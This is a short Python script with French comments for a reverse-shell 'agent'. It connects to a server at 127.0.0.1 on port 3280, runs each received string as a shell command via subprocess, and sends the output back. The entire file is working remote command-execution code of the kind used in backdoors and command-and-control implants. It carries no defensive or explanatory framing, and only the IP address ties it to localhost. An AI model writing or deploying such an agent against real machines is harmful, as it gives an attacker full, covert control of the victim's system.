import socket
import subprocess

ip_add = "127.0.0.1"
port = 3280

# Lance l'agent
def start_agent(s):
    s.connect((ip_add, port))
    data_socket(s)

# Reception des données et envoie
def data_socket(s):
    while True:
        try:
            request = s.recv(1024)
            if not request:
                break
            command = request.decode("utf-8")
            result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            stdout, stderr = result.communicate()
            output = stdout.decode("cp1252", errors="replace") + stderr.decode("cp1252", errors="replace")
            # Envoi du résultat au serveur
            s.send(output.encode("utf-8"))
            
        except Exception as e:
            print(f"Error: {e}")
            break
    s.close()

if __name__ == "__main__":
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    start_agent(s)
    data_socket(s)


        
